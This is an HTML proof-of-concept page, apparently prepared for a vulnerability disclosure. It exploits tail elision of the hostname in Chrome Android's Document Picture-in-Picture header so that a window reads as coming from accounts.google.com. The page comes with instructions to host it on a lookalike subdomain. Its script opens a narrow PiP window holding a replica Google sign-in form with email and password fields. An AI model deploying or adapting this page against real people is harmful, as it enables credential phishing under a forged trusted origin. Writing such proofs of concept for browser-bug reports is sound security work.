<!DOCTYPE html>
<!--
  Android Document-PiP origin-spoof POC.

  Host this page at:
      https://accounts.google.com.x.<YOUR-ETLD+1>/poc.html
  (any long left-anchored "trusted-looking" prefix works; the registrable
  domain at the right end is what gets clipped).

  The Android Document-PiP header renders the opener hostname via raw
  GURL.getHost() into a singleLine TextView with android:ellipsize="end"
  (tail elision). It never calls UrlFormatter.formatUrlForSecurityDisplay()
  and never scrolls/elides to keep the eTLD+1 visible. By choosing a narrow
  PiP window width, the attacker clips the registrable domain off the right
  edge so the always-on-top trusted header reads "accounts.google.comâ€¦".
-->
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>tap to continue</title>
<style>
  body { font-family: Roboto, sans-serif; margin: 2em; }
  button { font-size: 1.2em; padding: .8em 1.4em; }
</style>
</head>
<body>
<p>Tap the button (single user gesture, no permission prompt):</p>
<button id="go">Sign in with Google</button>
<pre id="log"></pre>

<script>
const log = m => document.getElementById('log').textContent += m + '\n';

document.getElementById('go').addEventListener('click', async () => {
  if (!('documentPictureInPicture' in window)) {
    log('documentPictureInPicture API not available.');
    log('On Android, enable chrome://flags#enable-android-document-picture-in-picture');
    return;
  }
  try {
    // Width chosen so the header URL bar (squeezed between two 48dp icons
    // + 6dp margins, weight=1) fits roughly "accounts.google.com" before
    // the right-edge ellipsis. Tune per device DPI / font metrics.
    // Android pinned-window minimum is 220dp; header min-unoccluded floor
    // is 156dp, so the URL TextView can be driven down to ~50-60dp wide.
    const pip = await documentPictureInPicture.requestWindow({
      width: 230,
      height: 320,
    });

    // Phishing payload rendered in the child WebContents, beneath the
    // browser-drawn header that now appears to attribute it to google.com.
    pip.document.head.innerHTML = `
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <style>
        body{margin:0;font-family:Roboto,Arial,sans-serif;background:#fff;
             display:flex;flex-direction:column;align-items:center;
             padding:18px 14px;box-sizing:border-box}
        img{width:64px;height:64px;margin-bottom:8px}
        h1{font-size:15px;font-weight:400;color:#202124;margin:0 0 14px}
        input{width:100%;padding:10px;margin:5px 0;border:1px solid #dadce0;
              border-radius:4px;font-size:13px;box-sizing:border-box}
        button{width:100%;background:#1a73e8;color:#fff;border:0;
               border-radius:4px;padding:10px;font-size:13px;margin-top:8px}
      </style>`;
    pip.document.body.innerHTML = `
      <svg width="60" height="60" viewBox="0 0 48 48">
        <path fill="#4285F4" d="M45 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h11.8c-.5 2.8-2 5.1-4.3 6.7v5.6h7C42.6 37 45 31.3 45 24.5z"/>
        <path fill="#34A853" d="M24 46c5.9 0 10.8-2 14.4-5.2l-7-5.6c-2 1.3-4.5 2.1-7.4 2.1-5.7 0-10.5-3.8-12.2-9H4.6v5.7C8.2 41.1 15.5 46 24 46z"/>
        <path fill="#FBBC05" d="M11.8 28.3c-.4-1.3-.7-2.8-.7-4.3s.2-3 .7-4.3v-5.7H4.6C3.1 17.1 2.3 20.5 2.3 24s.8 6.9 2.3 10l7.2-5.7z"/>
        <path fill="#EA4335" d="M24 10.7c3.2 0 6.1 1.1 8.4 3.3l6.3-6.3C34.8 4.1 29.9 2 24 2 15.5 2 8.2 6.9 4.6 14l7.2 5.7c1.7-5.2 6.5-9 12.2-9z"/>
      </svg>
      <h1>Sign in</h1>
      <input type="email"    placeholder="Email or phone" autocomplete="username">
      <input type="password" placeholder="Password"       autocomplete="current-password">
      <button>Next</button>`;

    log('PiP opened. Observe the header origin text.');
    log('Opener host = ' + location.host);
  } catch (e) {
    log('requestWindow failed: ' + e);
  }
});
</script>
</body>
</html>
